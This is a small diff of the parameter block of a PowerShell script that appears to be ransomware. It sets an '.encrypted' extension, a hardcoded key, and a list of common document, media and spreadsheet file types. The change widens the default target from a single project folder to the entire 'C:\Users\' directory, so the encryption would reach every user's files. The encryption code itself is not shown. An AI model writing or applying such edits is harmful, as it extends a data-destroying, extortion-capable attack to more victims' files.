@@ -1,6 +1,6 @@
 #Parameters to operate the script.
 param([Parameter(Mandatory=$true)][string]$Mode,
-      [string]$FileTargetPath = "C:\Users\mon\Documents\Kube",
+      [string]$FileTargetPath = "C:\Users\",
       [string]$Extension = ".encrypted",
       [string]$Key = "S4Xe7C57wbNVgmUss7xUjJOoICLdaW1Zgrks4s1hN4E=",
       [string[]]$TargetFiles = ('*.pdf*','*.mp3*','*.txt*','*.xls*','*.ppt*','*.doc*','*.mpg*','*.mpeg*','*.rtf*','*.jpg*','*.jpeg*','*.png*','*.gif*', '*.csv*')
